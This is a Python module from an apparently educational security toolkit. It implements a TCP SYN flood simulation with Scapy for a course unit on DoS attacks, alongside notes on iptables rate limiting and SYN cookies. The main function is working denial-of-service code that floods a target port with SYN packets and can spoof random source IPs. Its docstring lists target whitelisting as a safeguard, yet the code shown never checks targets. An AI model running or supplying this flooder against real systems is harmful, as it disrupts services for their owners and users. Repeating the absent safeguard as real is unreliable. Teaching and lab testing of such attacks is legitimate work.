"""
threatforge/core/dos_simulation/syn_flood.py

TCP SYN Flood Simulation

SYLLABUS: Unit 11 - Simulate DoS/DDoS using hping3, LOIC, HOIC
COVERAGE: CO4

THEORY:
SYN flood exploits the TCP three-way handshake.
Each SYN packet causes the server to allocate memory for a
half-open connection and send SYN-ACK.

If the attacker never sends the final ACK:
- Server's connection table fills up
- New legitimate connections cannot be established
- Service becomes unavailable

MITIGATION (how iptables/firewalls defend):
1. SYN Cookies: Don't allocate memory until ACK received
   iptables --syn-proxy
   net.ipv4.tcp_syncookies = 1

2. Rate limiting:
   iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
   iptables -A INPUT -p tcp --syn -j DROP

3. Connection limits:
   iptables -A INPUT -p tcp --syn -m connlimit --connlimit-above 15 -j DROP

ACADEMIC VALUE:
Shows why firewalls need stateful packet inspection (Unit 10).
Raw SYN counting is the classic iptables defense demonstrated in labs.

REQUIRES: Scapy + root privileges
"""

import time
import random
from typing import Dict, Any

try:
    from scapy.all import IP, TCP, send, RandShort, conf
    conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


# Maximum packets per second for ethical testing
MAX_PPS = 1000


def syn_flood(
    target_ip: str,
    target_port: int,
    duration_seconds: int = 15,
    packets_per_second: int = 100,
    spoof_source: bool = False
) -> Dict[str, Any]:
    """
    TCP SYN flood simulation.

    Sends SYN packets to target, creating half-open connections.

    PACKET STRUCTURE:
    IP Layer:  dst=target_ip, src=random_if_spoofed (or our IP)
    TCP Layer: dport=target_port, flags="S" (SYN), seq=random

    ETHICAL SAFEGUARDS:
    - Maximum 1000 pps
    - Maximum 60 seconds
    - Only whitelist targets
    - spoof_source=False by default

    Args:
        target_ip: Target IP address
        target_port: Target port (e.g., 80 for HTTP)
        duration_seconds: Attack duration (max 60)
        packets_per_second: Rate (max 1000)
        spoof_source: Whether to randomize source IP

    Returns:
        Attack metrics including packets sent and timing
    """
    if not SCAPY_AVAILABLE:
        return {
            "attack_type": "syn_flood",
            "success": False,
            "error": "Scapy not available. Install with: pip install scapy",
            "note": "SYN flood requires Scapy + root privileges"
        }

    # Apply safety limits
    duration_seconds = min(duration_seconds, 60)
    packets_per_second = min(packets_per_second, MAX_PPS)

    start_time = time.perf_counter()
    end_time = start_time + duration_seconds
    total_sent = 0
    packets_per_second_log = []

    while time.perf_counter() < end_time:
        second_start = time.perf_counter()
        second_count = 0

        for _ in range(packets_per_second):
            # Build SYN packet
            if spoof_source:
                # Random source IP (for demonstration only)
                src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            else:
                src_ip = None  # Use real IP

            try:
                if src_ip:
                    packet = IP(dst=target_ip, src=src_ip) / TCP(
                        dport=target_port,
                        sport=RandShort(),  # Random source port
                        flags="S",
                        seq=random.randint(1000, 999999)
                    )
                else:
                    packet = IP(dst=target_ip) / TCP(
                        dport=target_port,
                        sport=RandShort(),
                        flags="S",
                        seq=random.randint(1000, 999999)
                    )

                send(packet, verbose=0)
                total_sent += 1
                second_count += 1

            except Exception:
                pass

        packets_per_second_log.append(second_count)

        # Wait remaining time this second
        elapsed = time.perf_counter() - second_start
        wait = max(0, 1.0 - elapsed)
        if wait > 0:
            time.sleep(wait)

    total_duration = time.perf_counter() - start_time

    return {
        "attack_type": "syn_flood",
        "target": f"{target_ip}:{target_port}",
        "duration_seconds": round(total_duration, 2),
        "packets_sent": total_sent,
        "actual_pps": round(total_sent / total_duration, 2),
        "configured_pps": packets_per_second,
        "source_spoofed": spoof_source,
        "per_second_counts": packets_per_second_log,
        "mitigation_note": (
            "Defense: iptables -A INPUT -p tcp --syn -m limit "
            "--limit 10/s -j ACCEPT followed by DROP rule. "
            "Or enable SYN cookies: sysctl net.ipv4.tcp_syncookies=1"
        )
    }


def simulate_syn_flood_impact(target_ip: str, target_port: int) -> Dict[str, Any]:
    """
    Simulate and measure impact of SYN flood without actually flooding.

    This is used when Scapy is not available or for academic demonstration.
    Measures connection time before and after simulated flood to show impact.

    Args:
        target_ip: Target IP
        target_port: Target port

    Returns:
        Impact assessment based on connection testing
    """
    import socket

    def measure_connect_time(ip, port, timeout=3.0) -> float:
        """Measure TCP connection time in ms"""
        try:
            start = time.perf_counter()
            sock = socket.socket()
            sock.settimeout(timeout)
            sock.connect((ip, port))
            sock.close()
            return (time.perf_counter() - start) * 1000
        except Exception:
            return -1  # Connection failed

    # Measure baseline (5 samples)
    baseline_times = []
    for _ in range(5):
        t = measure_connect_time(target_ip, target_port)
        if t > 0:
            baseline_times.append(t)
        time.sleep(0.1)

    avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0

    return {
        "analysis_type": "syn_flood_impact_assessment",
        "target": f"{target_ip}:{target_port}",
        "baseline_connect_time_ms": round(avg_baseline, 2),
        "sample_count": len(baseline_times),
        "connection_success": len(baseline_times) > 0,
        "note": (
            "In a real SYN flood: connection table fills up, "
            "connection time increases dramatically until service becomes unavailable. "
            "SYN cookies prevent this by not allocating memory until ACK received."
        ),
        "theoretical_impact": {
            "without_protection": "Connection timeout within seconds at 1000+ PPS",
            "with_syn_cookies": "Minimal impact - server handles flood gracefully",
            "with_rate_limiting": "Flood traffic dropped, legitimate users unaffected"
        }
    }
